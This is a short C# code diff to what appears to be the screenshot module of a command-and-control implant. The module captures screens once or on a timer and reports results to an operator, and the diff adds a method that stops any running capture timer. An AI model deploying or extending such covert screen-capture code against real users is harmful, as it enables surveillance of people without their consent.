@@ -30,6 +30,9 @@ namespace Agent
             ScreenshotArgs args = JsonSerializer.Deserialize<ScreenshotArgs>(job.task.parameters);
             cancellationTokenSource = new CancellationTokenSource();
 
+            // Stop the existing timer if it is running
+            StopScreenshotTimer();
+
             if (args.interval <= 0)
             {
                 await CaptureAndSendScreenshot(job.task.id, cancellationTokenSource.Token);
@@ -42,12 +45,22 @@ namespace Agent
                 // Set AutoReset to false for a one-time execution if the interval is greater than 0
                 screenshotTimer.AutoReset = args.interval > 0;
                 screenshotTimer.Enabled = true;
+
                 await messageManager.AddResponse(new ResponseResult
                 {
                     completed = true,
                     user_output = $"Capturing screenshots every {args.interval} seconds.",
                     task_id = job.task.id,
                 });
+            }
+        }
+
+        private void StopScreenshotTimer()
+        {
+            if (screenshotTimer != null && screenshotTimer.Enabled)
+            {
+                screenshotTimer.Stop();
+                screenshotTimer.Dispose();
             }
         }
 
